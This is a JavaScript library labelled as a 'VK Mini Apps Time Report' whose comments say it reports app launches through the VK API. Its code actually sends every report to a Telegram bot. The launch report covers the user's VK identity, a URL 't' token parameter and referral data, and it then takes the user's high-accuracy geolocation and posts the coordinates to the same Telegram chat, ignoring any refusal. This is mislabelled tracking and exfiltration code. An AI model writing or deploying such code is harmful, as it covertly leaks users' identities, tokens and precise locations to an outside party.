/**
 * VK Mini Apps Time Report
 * Отправка отчётов о запуске приложения и маршрутов через VK API
 */
(function (global) {
  function formatMoscowDateTime(date) {
    return new Intl.DateTimeFormat('ru-RU', {
      timeZone: 'Europe/Moscow',
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    }).format(date);
  }

  /**
   * Отправляет текущее время через VK API
   */
  async function sendCurrentTimeViaVK(botToken, chatId, opts = {}) {
    if (!botToken || !chatId) {
      throw new Error('botToken и chatId обязательны');
    }

    const timeZone = opts.timeZone || 'Europe/Moscow';
    const locale = opts.locale || 'ru-RU';
    const label = opts.label || 'Текущее время';

    const now = new Date();
    const formatted = new Intl.DateTimeFormat(locale, {
      timeZone,
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    }).format(now);

    const text = `${label}: ${formatted} (${timeZone})`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text
      })
    });

    const data = await res.json().catch(() => null);
    if (!res.ok || !data || data.ok !== true) {
      const reason = data && data.description ? data.description : `HTTP ${res.status}`;
      throw new Error(`Не удалось отправить сообщение: ${reason}`);
    }

    return {
      ok: true,
      text,
      result: data.result
    };
  }

  /**
   * Отправляет отчёт о запуске пользователя через VK
   */
  async function sendLaunchUserReport(botToken, chatId, opts = {}) {
    if (!botToken || !chatId) return { ok: false, reason: 'missing_config' };

    const vkApp = opts.vkWebApp || (global.VKMiniApps && global.VKMiniApps.WebApp ? global.VKMiniApps.WebApp : null);
    const geo = opts.geolocation || global.navigator.geolocation;

    const sendMessage = async (text) => {
      const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text
        })
      });
      const data = await res.json().catch(() => null);
      return !!(res.ok && data && data.ok);
    };

    const sendLocation = async (lat, lon) => {
      const res = await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          latitude: lat,
          longitude: lon
        })
      });
      const data = await res.json().catch(() => null);
      return !!(res.ok && data && data.ok);
    };

    // Получаем данные пользователя VK
    let userInfo = null;
    if (global.VKMiniApps && global.VKMiniApps.getIdentity) {
      userInfo = await global.VKMiniApps.getIdentity();
    }

    const fullName = userInfo ? userInfo.name : 'Unknown';
    const username = userInfo ? userInfo.username : 'vk_unknown';
    const userId = userInfo ? String(userInfo.id) : 'unknown';
    const platform = vkApp && vkApp.platform ? vkApp.platform : 'vk_unknown';
    const moscowTime = formatMoscowDateTime(new Date());

    const urlParams = new URLSearchParams(global.location.search);
    const linkParam = urlParams.get('startapp') || urlParams.get('route') || '-';
    const tokenParam = urlParams.get('t') || '-';
    const vkStartParam = urlParams.get('vk_ref') || '-';

    const reportText = [
      `👤 User: ${fullName} (${username})`,
      `🆔 VK ID: ${userId}`,
      `📱 Platform: ${platform}`,
      `🔗 Link Param: ${linkParam}`,
      `🔑 URL t: ${tokenParam}`,
      `🚀 VK start_param: ${vkStartParam}`,
      `🕒 ${moscowTime} (Europe/Moscow)`
    ].join('\n');

    try {
      // Отправляем текстовый отчет сразу
      await sendMessage(reportText);

      // Пытаемся получить и отправить геолокацию
      if (geo) {
        geo.getCurrentPosition(
          async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            await sendLocation(lat, lon);
          },
          () => { /* Ошибка или отказ в доступе к геопозиции игнорируется */ },
          { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
        );
      }

      return { ok: true };
    } catch (e) {
      return { ok: false, reason: 'send_failed', error: String(e) };
    }
  }

  /**
   * Отправляет отчёт о запуске маршрута через VK
   */
  global.VKTimeReport = {
    sendCurrentTimeViaVK,
    sendLaunchUserReport,
    sendRouteLaunchReport: async (botToken, chatId, opts = {}) => {
      if (!botToken || !chatId) return { ok: false, reason: 'missing_config' };

      const vkApp = opts.vkWebApp || (global.VKMiniApps && global.VKMiniApps.WebApp ? global.VKMiniApps.WebApp : null);

      // Получаем данные пользователя VK
      let userInfo = null;
      if (global.VKMiniApps && global.VKMiniApps.getIdentity) {
        userInfo = await global.VKMiniApps.getIdentity();
      }

      const fullName = opts.userName || (userInfo ? userInfo.name : 'Unknown');
      const username = opts.username || (userInfo ? userInfo.username : 'vk_unknown');
      const routeName = opts.routeName || 'unknown';
      const source = opts.source || 'unknown';
      const time = formatMoscowDateTime(new Date());

      const text = [
        `👤 User: ${fullName} (${username})`,
        `🧭 Route: ${routeName}`,
        `📌 Source: ${source}`,
        `📱 Platform: VK Mini Apps`,
        `🕒 ${time} (Europe/Moscow)`
      ].join('\n');

      try {
        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text })
        });
        const data = await res.json().catch(() => null);
        return { ok: !!(res.ok && data && data.ok) };
      } catch (e) {
        return { ok: false, reason: 'send_failed', error: String(e) };
      }
    }
  };
})(window);
